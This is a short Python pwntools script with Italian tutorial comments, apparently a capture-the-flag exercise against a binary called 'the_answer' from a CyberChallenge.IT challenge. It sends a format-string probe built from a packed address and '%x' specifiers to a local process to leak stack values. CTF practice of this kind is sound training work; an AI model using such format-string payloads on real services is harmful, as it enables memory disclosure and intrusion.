#!/usr/bin/env python3

# Importa la libreria di pwntools
from pwn import *


def main():
    '''
    remote(hostname, port) apre una socket e ritorna un object
    che può essere usato per inviare e ricevere dati sulla socket  
    '''
    HOST = "answer.challs.cyberchallenge.it"
    PORT = 9122
    #r = remote(HOST, PORT)
    exe = ELF("./the_answer")
    r = process(exe.path)


    # .send() può essere invocato sull'oggetto ritornato da remote() per inviare dati
    #r.send(b"Ciao!")

    # .sendline() è identico a .send(), però appende un newline dopo i dati
    #r.sendline(b"Ciao!")

    # .sendafter() e .sendlineafter() inviano la stringa "Ciao!"
    #r.sendafter(b"... Invia un qualsiasi carattere per iniziare ...", b"k")


    # .recvuntil() legge dalla socket finchè non viene incontrata la stringa "something"

    answer_address = p64(0x601078, endianness='little')
    string = "a" * 3
    string_bytes = str.encode(string)
    payload = answer_address + string_bytes + b"%x %x %x %x"
    tmp = "address" + " %x %x %x %x"
    print(type(payload))
    print(payload)
    data = r.recv(1024)
    r.sendline(payload)

    data = r.recv(1024)
    print(data)

    data = r.recv(1024)
    print(data)

    # permette di interagire con la connessione direttamente dalla shell
    #r.interactive()

    # chiude la socket
    r.close()


if __name__ == "__main__":
    main()
